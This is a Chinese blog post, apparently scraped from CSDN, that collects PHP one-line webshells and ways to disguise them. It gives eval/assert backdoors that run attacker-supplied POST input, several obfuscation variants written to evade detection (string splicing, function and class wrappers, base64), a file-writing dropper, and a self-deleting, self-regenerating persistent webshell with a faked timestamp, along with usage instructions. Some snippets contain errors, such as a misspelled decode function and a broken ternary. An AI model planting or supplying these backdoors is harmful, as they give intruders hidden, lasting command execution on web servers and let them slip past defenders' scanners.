{"blogid": "113745113", "writerAge": "码龄3年", "writerBlogNum": "60", "writerCollect": "217", "writerComment": "46", "writerFan": "400", "writerGrade": "3级", "writerIntegral": "764", "writerName": "Lum1n0us", "writerProfileAdress": "writer_image\\profile_113745113.jpg", "writerRankTotal": "44003", "writerRankWeekly": "361088", "writerThumb": "49", "writerVisitNum": "28163", "blog_read_count": "3216", "blog_time": "于 2021-08-12 11:37:45 发布", "blog_title": "一句话木马及免杀", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"markdown_views prism-atom-one-dark\" id=\"content_views\">\n<svg style=\"display: none;\" xmlns=\"http://www.w3.org/2000/svg\">\n<path d=\"M5,0 0,2.5 5,5z\" id=\"raphael-marker-block\" stroke-linecap=\"round\" style=\"-webkit-tap-highlight-color: rgba(0, 0, 0, 0);\"></path>\n</svg>\n<p>这篇文章主要是总结一句话木马，并实现一句话木马的简单免杀，以及一个不死马的实现。<br/> </p>\n<div class=\"toc\">\n<h3>文章目录</h3>\n<ul><li><ul><li><a href=\"#_2\">一句话木马及原理</a></li><li><a href=\"#_15\">一句话木马简单免杀</a></li><li><ul><li><a href=\"#assert_18\">一、assert()</a></li><li><a href=\"#_26\">二、字符串拼接</a></li><li><a href=\"#_57\">三、函数</a></li><li><a href=\"#request_70\">四、request请求</a></li><li><a href=\"#_80\">五、类</a></li><li><a href=\"#base64_95\">六、base64加解密</a></li><li><a href=\"#_103\">七、写入木马</a></li></ul>\n</li><li><a href=\"#_120\">不死马</a></li></ul>\n</li></ul>\n</div>\n<p></p>\n<h2><a id=\"_2\"></a>一句话木马及原理</h2>\n<p>首先，来看最简单的一句话木马：</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>前面的<code>&lt;?php ?&gt;</code>是php的文件格式，<code>@</code>是让程序在执行错误的情况下也不要报错，<code>eval()</code>函数是将括号里的内容都当作代码执行，<code>$_POST['cmd']</code>应该都很熟悉了，通过<code>cmd</code>这个参数post提交数据。<br/> 举个例子，我在网站根目录下写入一句话木马<br/> <img alt=\"在这里插入图片描述\" src=\"image\\20210207180807191.png\"/><br/> 随后在127.0.0.1/index.php中，post提交cmd的数据为<code>phpinfo();</code>，出现了相应的界面，可以看到出现了命令执行漏洞。<br/> <img alt=\"在这里插入图片描述\" src=\"image\\20210207181112841.png\"/><br/> 除了这样命令执行，还可以用蚁剑、菜刀进行连接。</p>\n<h2><a id=\"_15\"></a>一句话木马简单免杀</h2>\n<p>从上面的演示中可以看到一句话木马的简单、高效，但就是因为其过于简单，查杀起来也很方便，所以要对其进行变形，让它不容易被发现。以下是几个免杀方法：</p>\n<h3><a id=\"assert_18\"></a>一、assert()</h3>\n<p>如果过滤了<code>eval</code>，可以使用<code>assert</code>绕过</p>\n<blockquote>\n<p>assert() 会检查指定的 assertion 并在结果为true时执行</p>\n</blockquote>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span> @<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h3><a id=\"_26\"></a>二、字符串拼接</h3>\n<p>当过滤了<code>eval、assert</code>两个关键字时，可以用字符串拼接的方式。介绍substr_replace()函数</p>\n<blockquote>\n<p>substr_replace(string,replacement,start,length)</p>\n</blockquote>\n<table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需，规定检查的字符串。</td></tr><tr><td>replacement</td><td>必需，规定要插入的字符串。</td></tr><tr><td>start</td><td>必需，规定在字符串的何处开始替换。若为0，从头开始。</td></tr><tr><td>length</td><td>可选。规定要替换多少个字符。默认是与字符串长度相同。</td></tr></tbody></table>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">substr_replace</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"assexx\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"rt\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t@<span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>在这个马中，是将第四位和第五位，也就是<code>xx</code>替换成<code>rt</code>，最终拼接成为<code>assert</code></p>\n<p>除了substr_replace()，还有一种拼接方法</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"a\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"s\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"e\"</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"rt\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$c</span><span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token operator\">.</span><span class=\"token variable\">$b</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$c</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h3><a id=\"_57\"></a>三、函数</h3>\n<p>可以利用函数来构造一句话木马</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">function</span> <span class=\"token function\">shyshy</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\t@<span class=\"token function\">shyshy</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>先是构造了<code>shyshy()</code>这一函数，然后调用函数，变成一句话木马。</p>\n<h3><a id=\"request_70\"></a>四、request请求</h3>\n<p>适用于过滤了<code>GET</code>和<code>POST</code>的情况下</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$b</span><span class=\"token operator\">.=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h3><a id=\"_80\"></a>五、类</h3>\n<p>可以构造一个类，利用魔术方法来拼接</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">class</span> <span class=\"token class-name\">shyshy</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t\t<span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"this-&gt;<span class=\"token interpolation\"><span class=\"token variable\">$a</span></span>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token punctuation\">}</span>\n\t\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">shyshy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$b</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">a</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h3><a id=\"base64_95\"></a>六、base64加解密</h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token function\">base_decode</span><span class=\"token punctuation\">(</span>YXNzZXJ0<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$b</span><span class=\"token operator\">=</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<h3><a id=\"_103\"></a>七、写入木马</h3>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token variable\">$d</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$$d</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'text'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//$data</span>\n\t\t<span class=\"token variable\">$f</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'fp'</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token variable\">$$f</span><span class=\"token operator\">=</span><span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'wb'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//$fp</span>\n\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"save success\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"save fail\"</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$fp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>这个代码通过在网站根目录下写一句话木马的方法，然后再去访问木马，从而getshell。</p>\n<h2><a id=\"_120\"></a>不死马</h2>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\t<span class=\"token function\">ignore_user_abort</span><span class=\"token punctuation\">(</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//设置与客户机断开是否会终止脚本的执行，true则不会</span>\n\t<span class=\"token function\">set_time_limit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//如果为零说明永久执行直到程序结束</span>\n\t<span class=\"token function\">unlink</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//调用unlink()的时候，文件还是存在的，只是目录里找不到该文件了，但是已经打开这个文件的进程可以正常读写</span>\n\t<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'./.index1.php'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$code</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'&lt;?php\n\t\tif(md5($_POST[\"pass\"])==\"xxxxxxxxxx\")  //给木马设置密码，防止他人使用\n\t\t{\n\t\t\t@eval($_POST[\"cmd\"]);\n\t\t}?&gt;'</span><span class=\"token punctuation\">;</span>  \n\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n\t\t<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'touch -m -d \"2018-12-01 9:10:12\" .index1.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  <span class=\"token comment\">//设置文件的编辑时间</span>\n\t<span class=\"token function\">usleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>实测时发现设置文件编辑时间那里会报错，可以选择把那一句删掉。<br/> 用法：<code>?pass=shyshy&amp;cmd=phpinfo();</code></p>\n</div>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-22a2fefd3b.css\" rel=\"stylesheet\"/>\n<link href=\"https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-4f8fbf9108.css\" rel=\"stylesheet\"/>\n</div>"}